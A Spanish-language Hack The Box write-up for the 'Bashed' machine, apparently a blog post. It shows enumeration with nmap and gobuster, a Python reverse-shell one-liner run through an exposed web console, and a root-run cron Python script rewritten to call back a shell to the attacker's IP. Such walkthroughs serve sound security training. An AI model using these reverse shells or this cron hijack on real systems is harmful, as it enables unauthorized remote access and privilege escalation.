---
title: "Bashed - WriteUp"
date: Fri Aug 23 2024 10:13:12 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [fuzzing, gobuster, pspy]
image: /assets/img/cabeceras/2024-08-23-bashed---writeup.png
---

## Enumeración

NMAP

```bash
# Nmap 7.94SVN scan initiated Sat Jan 27 20:55:30 2024 as: nmap -sCV -p 80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xs
l -oN targeted -oX targetedXML 10.129.79.90
Nmap scan report for 10.129.79.90
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 27 20:55:38 2024 -- 1 IP address (1 host up) scanned in 8.04 seconds
```

NMAP HTTP-ENUM

```bash
nmap -sCV -p80 --script http-enum 10.129.79.90
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 20:57 CET
Nmap scan report for 10.129.79.90
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /php/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /uploads/: Potentially interesting folder

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.96 seconds
```

HTTP

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127205956.png)

Vamos a realizar fuzzing de directorios y ficheros.

```bash
$ gobuster dir -u http://10.129.79.90 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --follow-redirect --add-slash
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/icons/               (Status: 403) [Size: 293]
/uploads/             (Status: 200) [Size: 14]
/php/                 (Status: 200) [Size: 940]
/css/                 (Status: 200) [Size: 1759]
/images/              (Status: 200) [Size: 1565]
/dev/                 (Status: 200) [Size: 1149]
/js/                  (Status: 200) [Size: 3166]
/fonts/               (Status: 200) [Size: 2096]
/server-status/       (Status: 403) [Size: 301]
```

Dentro de /dev encontramos lo siguiente:

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127211027.png)

Si pulsamos en cualquiera de los dos abriremos una consola de ejecución local de comandos.

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127211226.png)


## Explotación

Vamos a intentar mandarnos una reverse shell.

Nos ponemos a la escucha por el puerto 4444 con _NetCat_

```bash
$ nc -nlvp 4444
```

Ejecutamos lo siguiente:

```bash
www-data@bashed:/var/www/html/dev# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.93",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127212741.png)

Hacemos un _sudo -l_ y vemos algo interesante...

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127220412.png)

Podemos ejecutar comandos como el usuario _scriptmanager_ sin proporcionar contraseña.

## Escalada

Nos subimos _linpeas_ y _pspy_ y seguimos enumerando...

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127220643.png)

Con _pspy_ descubrimos que root ejecuta un script en python que ejecuta todos los scripts con extensión .py dentro de la carpeta /scripts. Pero no podemos ver ni entrar en esa carpeta, vamos a ver a quién pertenece...

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127220925.png)

Sospechosamente pertenece al usuario _scriptmanager_...

Pero recordamos que tenemos el permiso de ejecutar tareas como ese usuario así que vamos a intentar enviarnos una shell...

```bash
$ sudo -u scriptmanager bash -i
```

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127221109.png)

Y funciona! somo el usuario _scriptmanager_!

Ahora podemos modificar y entrar en la carpeta /script. Como existe una tarea que ejecuta scripts cada dos minutos como usuario _root_, lo que tendremos que hacer es crear un archivo Python que nos mande una shell ...

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127221415.png)

Creo que bastará con modificar el archivo .py existente.

Lo abrimos y lo dejamos así:

```python
import socket,subprocess,os 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.93",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")

f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

Grabamos y nos ponemos en escucha por el puerto que hayamos indicado:

```bash
$ mc -nlvp 8888
```

![image](/assets/img/2024-08-23-bashed---writeup/pasted-image-20240127222242.png)

Reto conseguido!

